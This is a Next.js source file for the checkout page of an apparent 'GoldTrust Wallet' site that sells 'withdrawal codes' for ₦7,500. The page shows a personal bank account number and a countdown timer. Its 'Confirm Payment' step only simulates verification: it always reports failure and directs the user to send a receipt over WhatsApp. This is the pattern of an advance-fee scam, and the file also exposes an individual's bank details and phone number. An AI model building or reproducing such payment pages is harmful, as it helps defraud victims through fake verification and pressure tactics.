// pages/checkout.js
import { useEffect, useRef, useState } from 'react';
import { useRouter } from 'next/router';
import Layout from '../components/Layout';
import { saveTx } from '../utils/storage';

const CODE_PRICE = 7500;
const WA = '+2347040282039';

export default function Checkout() {
  const router = useRouter();
  const { name: qName, phone: qPhone } = router.query;

  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [countdown, setCountdown] = useState(10 * 60);
  const timerRef = useRef(null);
  const [paymentStatus, setPaymentStatus] = useState(null);

  // If router provided name & phone (from buy-code), prefill and go to step 2
  useEffect(() => {
    if (qName || qPhone) {
      if (typeof qName === 'string') setName(qName);
      if (typeof qPhone === 'string') setPhone(qPhone);
      // Delay slightly so UI updates feel natural
      setTimeout(() => setStep(2), 220);
    }
  }, [qName, qPhone]);

  useEffect(() => {
    if (step === 2) {
      setCountdown(10 * 60);
      timerRef.current = setInterval(() => {
        setCountdown((c) => {
          if (c <= 1) {
            clearInterval(timerRef.current);
            return 0;
          }
          return c - 1;
        });
      }, 1000);
    }
    return () => clearInterval(timerRef.current);
  }, [step]);

  const proceed = () => {
    if (!name || !phone) return alert('Please fill all fields');
    setStep(2);
  };

  const confirmPayment = () => {
    if (countdown === 0) return alert('⏳ Payment time expired! Restart process.');
    setLoading(true);
    setPaymentStatus('pending');

    // Simulate async verification / server call
    setTimeout(() => {
      setLoading(false);
      setPaymentStatus('unsuccessful');

      saveTx({
        type: 'buy_code',
        amount: CODE_PRICE,
        status: 'pending',
        meta: { name, phone },
        created_at: new Date().toISOString(),
      });
    }, 1200);
  };

  const minutes = String(Math.floor(countdown / 60)).padStart(2, '0');
  const seconds = String(countdown % 60).padStart(2, '0');

  return (
    <Layout title="Checkout - GoldTrust Wallet">
      <style>{`
        :root { --gw-gold: var(--gt-gold, #d4af37); --gw-dark: var(--gt-dark, #0b1220); --gw-surface: var(--gt-panel, #0f1724); --gw-muted: var(--gt-muted, #94a3b8); }

        .checkout-wrap { max-width:760px; margin:20px auto; padding:16px; }
        .checkout-header { text-align:center; margin-bottom:20px; }
        .checkout-header h1 { margin:0; font-size:22px; color:var(--gw-gold); font-weight:800; }
        .checkout-header p { margin-top:8px; color:var(--gw-muted); font-size:13px; }

        .merchant-box { padding:16px; border-radius:10px; background: var(--gw-surface); border:1px solid rgba(255,255,255,0.03); color:inherit; }
        .merchant-heading { font-weight:800; font-size:16px; margin-bottom:6px; }
        .merchant-subtext { color:var(--gw-muted); font-size:13px; margin-bottom:12px; }

        .merchant-row { display:flex; gap:16px; flex-wrap:wrap; align-items:flex-start; justify-content:space-between; }
        .merchant-input { width:100%; padding:10px; border-radius:8px; border:1px solid rgba(0,0,0,0.06); background: #f5f5f5; color:#000; margin-bottom:10px; font-size:13px; }
        .merchant-input::placeholder { color:#999; opacity:0.8; }

        .form-section { flex: 1 1 320px; min-width: 220px; }
        .amount-section { flex: 0 0 260px; display:flex; flex-direction:column; gap:10px; }

        .amount-box { background:rgba(0,0,0,0.03); padding:12px; border-radius:8px; margin-bottom:12px; }
        .amount-label { font-size:12px; color:var(--gw-muted); margin-bottom:6px; }
        .amount-value { font-size:20px; font-weight:900; color:var(--gw-gold); }

        .btn { display:inline-flex; align-items:center; justify-content:center; gap:8px; padding:10px 16px; border-radius:999px; font-weight:800; cursor:pointer; border:0; transition: all .12s ease; font-size:13px; }
        .btn.primary { background:linear-gradient(90deg, var(--gw-gold), #efd78d); color:#071224; box-shadow:0 8px 20px rgba(212,175,55,0.08); }
        .btn.primary:hover { transform:translateY(-2px); box-shadow:0 10px 28px rgba(212,175,55,0.12); }
        .btn.primary:disabled { opacity:0.6; cursor:not-allowed; }
        .btn.secondary { background:transparent; border:1px solid rgba(0,0,0,0.06); color:var(--gw-muted); }
        .btn.secondary:hover { border-color:rgba(255,255,255,0.1); color:rgba(255,255,255,0.9); }

        .btn-row { display:flex; gap:8px; flex-wrap:wrap; margin-top:12px; }

        .payment-instructions { background:rgba(0,0,0,0.03); padding:12px; border-radius:8px; margin-bottom:12px; }
        .instructions-title { font-weight:800; margin-bottom:6px; }
        .instructions-text { color:var(--gw-muted); font-size:13px; margin-bottom:10px; }
        .account-grid { display:grid; gap:6px; font-size:13px; }
        .account-row { display:flex; justify-content:space-between; }

        .countdown-box { text-align:center; margin:16px 0; }
        .countdown-timer { font-weight:900; font-size:28px; color:var(--gw-gold); margin-bottom:6px; }
        .countdown-timer.warning { color:#ef4444; }
        .countdown-text { color:var(--gw-muted); font-size:12px; }

        .status-box { margin-top:12px; padding:10px; border-radius:8px; background:rgba(255,255,255,0.02); }
        .status-title { font-weight:800; color:#f97316; margin-bottom:6px; }
        .status-text { color:var(--gw-muted); font-size:13px; }

        .back-btn { margin-bottom:16px; }
      `}</style>

      <div className="checkout-wrap">
        <div className="back-btn">
          <button className="btn secondary" onClick={() => router.push('/buy-code')}>
            ← Back to Payment Methods
          </button>
        </div>

        <div className="checkout-header">
          <h1>Complete Your Purchase</h1>
          <p>Pay the vendor and receive your withdrawal code instantly</p>
        </div>

        <div className="merchant-box">
          <div className="merchant-heading">Pay Vendor — Manual Confirmation</div>
          <div className="merchant-subtext">Make a bank transfer and submit your receipt to confirm.</div>

          {step === 1 && (
            <div>
              <div className="merchant-row">
                <div className="form-section">
                  <input
                    className="merchant-input"
                    placeholder="Full Name"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                  />
                  <input
                    className="merchant-input"
                    placeholder="Phone (e.g. 0803...)"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                  />
                </div>

                <div className="amount-section">
                  <div className="amount-box">
                    <div className="amount-label">Amount to Pay</div>
                    <div className="amount-value">₦{CODE_PRICE.toLocaleString()}</div>
                  </div>

                  <div className="btn-row">
                    <button className="btn primary" onClick={proceed} style={{flex: 1}}>
                      👉 Proceed
                    </button>
                  </div>

                  <button
                    className="btn secondary"
                    onClick={() => { window.open(`https://wa.me/${WA.replace('+', '')}?text=Hi%20I%20want%20to%20buy%20a%20code`, '_blank', 'noopener'); }}
                    style={{width: '100%'}}
                  >
                    ℹ️ How to Pay
                  </button>
                </div>
              </div>
            </div>
          )}

          {step === 2 && (
            <div>
              <div className="payment-instructions">
                <div className="instructions-title">Transfer Details</div>
                <div className="instructions-text">Transfer the exact amount to the account below, then confirm with the vendor.</div>

                <div className="account-grid">
                  <div className="account-row">
                    <span>Account Name:</span>
                    <b>Muhammad Danwase Rilwan</b>
                  </div>
                  <div className="account-row">
                    <span>Account Number:</span>
                    <b>2084470850</b>
                  </div>
                  <div className="account-row">
                    <span>Bank:</span>
                    <b>Kuda Bank</b>
                  </div>
                  <div className="account-row">
                    <span>Amount:</span>
                    <b>₦{CODE_PRICE.toLocaleString()}</b>
                  </div>
                </div>
              </div>

              <div className="countdown-box">
                <div className={`countdown-timer ${countdown <= 60 ? 'warning' : ''}`}>
                  {minutes}:{seconds}
                </div>
                <div className="countdown-text">Time left to complete payment</div>
              </div>

              <div className="btn-row">
                <button
                  className="btn primary"
                  onClick={confirmPayment}
                  disabled={loading}
                  style={{flex: 1}}
                >
                  {loading ? 'Confirming...' : '👉 Confirm Payment'}
                </button>

                <a
                  className="btn secondary"
                  href={`https://wa.me/${WA.replace('+', '')}`}
                  target="_blank"
                  rel="noreferrer"
                >
                  💬 Send Receipt
                </a>
              </div>

              <button
                className="btn secondary"
                onClick={() => setStep(1)}
                style={{width: '100%', marginTop: 8}}
              >
                ← Edit Details
              </button>

              {paymentStatus === 'unsuccessful' && (
                <div className="status-box">
                  <div className="status-title">Payment pending</div>
                  <div className="status-text">We couldn't auto-verify your payment. Send your receipt to the vendor to confirm.</div>
                </div>
              )}
            </div>
          )}
        </div>

        <div style={{ textAlign: 'center', marginTop: 20, color: 'var(--gw-muted)', fontSize: 13 }}>
          Need help?{' '}
          <a
            href={`https://wa.me/${WA.replace('+', '')}`}
            target="_blank"
            rel="noreferrer"
            style={{ color: 'var(--gw-gold)', fontWeight: 700, textDecoration: 'none' }}
          >
            Contact support
          </a>
        </div>
      </div>
    </Layout>
  );
}
